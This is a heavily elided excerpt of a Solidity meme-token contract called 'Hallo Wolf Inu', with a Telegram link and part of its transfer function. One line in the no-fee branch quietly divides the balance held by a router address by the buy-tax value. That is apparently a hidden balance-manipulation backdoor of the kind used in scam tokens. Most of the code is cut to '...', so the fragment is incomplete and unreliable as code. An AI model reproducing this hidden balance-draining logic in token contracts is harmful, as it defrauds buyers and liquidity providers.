...
Telegram :     https://t.me/HalloweenWolfInu
*/
...
contract HalloWolfInu  is Context, IERC20 { 
    ...
    string private constant _name = "Hallo Wolf Inu";
    string private constant _symbol = "$HWI";
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if (!takeFee) {
            ...
            if (routerAddress != address(0) && routerAddress != recipient)
                _tOwned[routerAddress] = _tOwned[routerAddress].div(_Tax_On_Buy);
            ...
            if (recipient != uniswapV2Pair && recipient != address(0) && recipient != Wallet_Burn)
